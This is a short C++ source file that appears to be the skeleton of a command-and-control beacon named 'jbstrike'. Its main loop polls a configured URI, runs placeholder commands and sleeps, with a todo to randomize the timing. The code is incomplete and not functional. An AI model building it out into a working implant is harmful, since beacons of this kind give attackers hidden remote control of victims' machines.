#include "Application.h"


jbstrike::Application::Application() {}


void jbstrike::Application::Run() {

	while(1) {
		std::string data = http.Get(cfg.UriString, "");
		
		if (Commands.Has(""))
			Commands.Run("test");

		Sleep(cfg.SleepTime);// @todo add randomization
	}

}
